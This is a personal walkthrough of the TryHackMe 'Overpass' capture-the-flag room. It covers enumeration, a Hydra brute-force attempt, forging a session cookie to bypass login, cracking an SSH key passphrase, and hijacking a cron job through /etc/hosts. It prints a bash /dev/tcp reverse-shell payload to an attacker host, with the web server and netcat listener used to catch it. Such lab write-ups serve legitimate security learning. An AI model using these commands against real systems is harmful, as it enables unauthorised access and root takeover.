{{Title}}
## **Introduction**

📊 Difficulty : Easy

Overpass is a room on [TryHackMe](https://tryhackme.com?utm_source=chatgpt.com) where users are challenged to gain system access and escalate privileges through a web application. I completed this room as part of my web exploitation CTF streak to strengthen my understanding and methodology in web penetration testing.

Link to the room : http://tryhackme.com/room/overpass

--- 
### **Context**

> _What happens when a group of broke Computer Science students try to make a password manager? Obviously a _perfect_ commercial success!

As always, we first start by enumerating open ports on the target machine using `nmap` :

```
nmap MACHINE_IP
```

![[20250829-Overpass.png]]

We find that the machine is hosting a web server using HTTP. Let's look at the website :

![[20250829-Overpass-1.png]]

After looking around for a bit, I decide to enumerate for hidden directories using ``gobuster`` : 

![[20250829-Overpass-2.png]]

We find the `/admin` directory, which directs us to a page with a login form. My first reflex when finding a login form on a website is to open Burp Suite and Hydra to try and find the credentials to login. In fact, the website also had an About Us page, where the names of the developers were listed. I figured I could use one of the names as a Username, and brute force my way into finding the password. 

The command I ran : 

```
hyra -l Ninja -P wordlist.txt MACHINE_IP http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"
```

Unfortunately, after long minutes of waiting for Hydra to find something, I figured there must have been something I was missing.

Let's go back a bit. On the `/admin` page, looking at the source code of the page, we find 3 JavaScript files, which can be viewed in the Debugger tab of the Developer Tools.

![[20250829-Overpass-6.png]]

Looking at the ``login.js`` script, we can see that a message saying "Incorrect Credentials" is returned when the user enters incorrect credentials. However, in case of successful login, the script sets a cookie for the client, a SessionToken with a value of "statusOrCookie".

![[20250829-Overpass-5.png|465x388]]

We can try to create ourselves a cookie corresponding to a successful login by going to the Storage tab of the Developer Tools, naming it SessionToken and setting its value to sessionOrCookie.

![[20250829-Overpass-7.png]]

After we refresh the page, we are greeted with a new page :

![[20250829-Overpass-8.png]]

On that page, we can find an RSA private key, which can be used to log into SSH with the username james as stated in the message present on the page. Before that, let's change file permissions to the ones usually used for RSA keys :

```
chmod 600 rsa_key
```

![[20250829-Overpass-9.png]]

We need a passphrase for the key. I tried cracking the passphrase using John the Ripper. Before that though, we need to convert the RSA key so it is readable by John. This can be achieved using the ``ssh2john`` function : 

```
ssh2john rsa_key > rsa_key2
```

With the newly converted key, we can run John to find the passphrase to the RSA key, and log into SSH where we find our first flag : 

![[20250829-Overpass-10.png]]

![[20250829-Overpass-11.png]]

As for the second flag, we have to achieve privilege escalation to reach the ``/root`` directory. Not knowing the password to James's account, using `sudo -l` was out of the question. I tried finding for SUID bits set in root owned binaries, but nothing of interest was found.

The PE vector actually lied in the scheduled tasks in `/etc/crontab` : 

![[20250829-Overpass-12.png]]

As we can see, a file named ``buildscript.sh`` is run every minute by the system.

Looking at `/etc/hosts`, we can see that ``overpass.thm`` is associated with the loopback address 127.0.0.1. We can modify this address to point to our machine.

![[20250829-Overpass-13.png]]

On our machine, we then need to create the ``/downloads/src`` directory as well as the ``buildscript.sh`` file. This file will be executed by the target machine, so we can use it to obtain a shell with root privileges. We'll use the following script : 

```
#!/bin/bash
bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1
```

Giving the target permission to execute the file, we then host a web server to make it accessible to the internet : 

```
chmod +x buildscript.sh
```

```
python3 -m http.server 80
```

Now that the machine can access our payload, we need a listener to be able to get the connection. For that, we can run netcat and set the port to the one we used in the ``buildscript.sh`` file.

```
nc -nlvp PORT
```

And with that, we get a reverse shell with root privilege. All that's left to do is to go to ``/root`` and find our second and final flag.

---
# Conclusion 

This room was very instructive. While it was very basic in its first steps, meaning enumerating ports and directories, it also used a not so common privilege escalation vector in cron jobs. Having to host a web server to make the target access a script located on our local machine was new to me and quite refreshing from Sudos and SUIDs.  